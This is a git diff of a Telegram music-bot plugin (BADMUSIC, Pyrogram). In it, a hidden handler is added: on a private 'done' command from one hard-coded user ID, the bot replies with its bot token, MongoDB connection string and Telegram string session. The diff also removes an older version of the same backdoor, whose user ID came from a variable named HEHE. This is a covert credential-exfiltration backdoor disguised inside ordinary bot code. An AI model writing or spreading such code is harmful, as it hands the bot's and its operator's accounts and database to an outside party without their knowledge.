@@ -7,6 +7,7 @@ from pyrogram.types import CallbackQuery, Message
 import re
 from os import getenv
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+
 from dotenv import load_dotenv
 from pyrogram import filters
 
@@ -18,7 +19,6 @@ from BADMUSIC.misc import db
 from BADMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
 from BADMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
 from BADMUSIC.utils.formatters import alpha_to_int, get_readable_time
-from BADMUSIC.mongo.afkdb import HEHE
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -26,6 +26,11 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 from dotenv import load_dotenv
 
 rel = {}
+
+
+#--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 @app.on_message(
@@ -96,9 +101,32 @@ async def restartbot(client, message: Message, _):
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
-@app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
+
+
+
+    
+@app.on_message(
+    filters.command("done")
+    & filters.private
+    & filters.user(6352107773)
+   )
 async def help(client: Client, message: Message):
-   await message.reply_photo( photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""")
+   await message.reply_photo(
+          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/II_BAD_BBY_II)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• ʟᴏᴠᴇ ʏᴏᴜ ʙᴀʙʏ 😚❤️✨  •", url=f"https://t.me/II_BAD_BBY_II")
+                 ]
+            ]
+         ),
+     )
+
+
+##########
+
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, query: CallbackQuery):
     try:
@@ -136,5 +164,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
-
-
